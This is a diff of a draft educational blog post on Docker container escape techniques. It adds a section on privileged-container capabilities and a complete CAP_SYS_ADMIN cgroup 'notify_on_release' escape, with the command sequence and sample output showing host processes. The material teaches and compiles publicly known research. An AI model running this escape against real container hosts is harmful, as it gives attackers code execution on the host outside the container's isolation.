@@ -4,7 +4,6 @@ date: 2020-07-11T13:09:54+02:00
 draft: true
 ---
 
-
 If you are bored of searching for the most-known container breakout techniques, here is a collection. This post addresses abuse of [shared root filesystem](#shared-host-root-directory) (2 ways), [privileged container](#privileged-container) (3 ways) and access to the [Docker Socket](#docker-socket) (1 way). Okay, to be fair – some techniques refer to each other. Enjoy! :)
 
 ## Intro
@@ -85,12 +84,63 @@ There are multiple ways to escape from a privileged container. Let us have a sta
 
 #### Capabilities
 
+We will now explore two techniques that can be used to break out of the container. It is important to note here that it is only possible to abuse the capabilities, because there is no seccop filter in place if a container is started with `--privileged`. The absence of a seccomp filter is not default in vase of a docker container.
+
+To explore the kernel capabilities, you can run the command `capsh --print`. In case of a privileged container, they get not reduced and the process have them all. An example output looks as following:
+```
+# capsh --print
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eip
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root)
+```
+
+##### `CAP_SYS_ADMIN` – cgroup release on notfy
+One of the of the highly sensitive kernel capabilities is `CAP_SYS_ADMIN`. If you are acting in a container with this capability, you can start manage the cgroups of the container. As a short re-cap – cgroups are used to manage the system resources of the container. 
+
+In this escape, we use a feature of cgroups that allows the execution of code in the root context, after the last process in a cgroup is terminated. The feature is called “notification on release” and can only be set, because we have the capability `CAP_SYS_ADMIN`. 
+
+This technique got popular after Fellix Wilhelm (@fel1x) from Google Project put the escape in one tweet. [Trail of Bits](https://www.trailofbits.com/) has even investigated further this topic and all details can be read in their blogpost [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/). 
+
+Here is just the quintessence of this approach:
+1. Create a new cgroup
+2. activate “callback” with `notify_on_release`
+3. create callback
+4. create ephemeral cgroup to trigger callback
+```
+# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/escape_cgroup
+
+# echo 1 > /tmp/cgrp/escape_cgroup/notify_on_release
+# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+# echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+# echo '#!/bin/sh' > /cmd
+# echo "ps aux | /sbin/tee $host_path/cmdout" >> /cmd
+# chmod a+x /cmd
+
+# sh -c "echo 0 > /tmp/cgrp/escape_cgroup/cgroup.procs" 
+# sleep 1
+# head /cmdout
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.0  0.1 108272 11216 ?        Ss   20:57   0:00 /sbin/init
+root           2  0.0  0.0      0     0 ?        S    20:57   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        I<   20:57   0:00 [rcu_gp]
+root           4  0.0  0.0      0     0 ?        I<   20:57   0:00 [rcu_par_gp]
+root           6  0.0  0.0      0     0 ?        I<   20:57   0:00 [kworker/0:0H-kblockd]
+root           7  0.0  0.0      0     0 ?        I    20:57   0:00 [kworker/u8:0-events_power_efficient]
+root           8  0.0  0.0      0     0 ?        I<   20:57   0:00 [mm_percpu_wq]
+root           9  0.0  0.0      0     0 ?        S    20:57   0:00 [ksoftirqd/0]
+root          10  0.0  0.0      0     0 ?        S    20:57   0:00 [rcuc/0]
+```
+
 ##### `CAP_SYS_Module` – Load Kernel Module 
 
 https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host 
-
-##### `CAP_SYS_ADMIN` – cgroup release on notfy
-TODO … have to read :D
 
 #### Host Devices
 
@@ -146,7 +196,7 @@ With the access to a privileged container, you can **perform** the **steps as al
 
 ## Conclusion
 
-The listed container breakouts are in my humble opinion the most basic one. The list is for sure not complete and as soon as I am in the mood, I might update, extend or re-organize the techniques. 
+The listed container breakouts are in my humble opinion the most basic one. The list is for sure not complete and as soon as I am in the mood, I might update, extend, or re-organize the techniques. 
 
 Due to the fact that I am only a consumer of already existing research I want to give out a big thanks for sharing the knowledge that I have consumed in the past years from:
 
